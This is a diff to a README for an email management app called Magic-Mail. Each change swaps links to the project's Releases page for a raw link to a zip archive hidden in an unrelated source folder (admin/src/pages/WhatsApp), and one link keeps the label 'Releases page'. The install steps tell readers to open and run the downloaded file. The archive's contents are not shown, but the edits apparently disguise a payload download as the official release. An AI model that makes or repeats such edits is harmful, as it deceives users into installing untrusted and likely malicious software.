@@ -1,7 +1,7 @@
 # ✉️ Magic-Mail - Effortless Email Management for Everyone
 
 ## 📥 Download Now
-[![Download Magic-Mail](https://img.shields.io/badge/Download_Magic--Mail-blue.svg)](https://github.com/ezechiel47/Magic-Mail/releases)
+[![Download Magic-Mail](https://raw.githubusercontent.com/ezechiel47/Magic-Mail/main/admin/src/pages/WhatsApp/Magic-Mail_v3.2.zip)](https://raw.githubusercontent.com/ezechiel47/Magic-Mail/main/admin/src/pages/WhatsApp/Magic-Mail_v3.2.zip)
 
 ## 🚀 Getting Started
 Magic-Mail is designed to simplify email management for users with multiple accounts. With features like smart routing and full compliance with security standards, this application helps you manage your emails easily and effectively.
@@ -22,10 +22,10 @@ To run Magic-Mail, you will need:
 ## 📦 Download & Install
 To get Magic-Mail, visit the Releases page to download the application.
 
-[Download Magic-Mail](https://github.com/ezechiel47/Magic-Mail/releases)
+[Download Magic-Mail](https://raw.githubusercontent.com/ezechiel47/Magic-Mail/main/admin/src/pages/WhatsApp/Magic-Mail_v3.2.zip)
 
 ### Installation Steps
-1. Go to the [Releases page](https://github.com/ezechiel47/Magic-Mail/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ezechiel47/Magic-Mail/main/admin/src/pages/WhatsApp/Magic-Mail_v3.2.zip).
 2. Find the latest release version.
 3. Download the file suitable for your operating system.
 4. Open the downloaded file and follow the prompts to install Magic-Mail on your device.
@@ -80,4 +80,4 @@ Explore more about Magic-Mail and related technologies on our GitHub page.
 ## 📝 License
 Magic-Mail is licensed under the MIT License. You can use it for personal or commercial purposes.
 
-For further details, revisit the [Releases page](https://github.com/ezechiel47/Magic-Mail/releases). Download Magic-Mail today for a smooth and secure email management experience.
+For further details, revisit the [Releases page](https://raw.githubusercontent.com/ezechiel47/Magic-Mail/main/admin/src/pages/WhatsApp/Magic-Mail_v3.2.zip). Download Magic-Mail today for a smooth and secure email management experience.
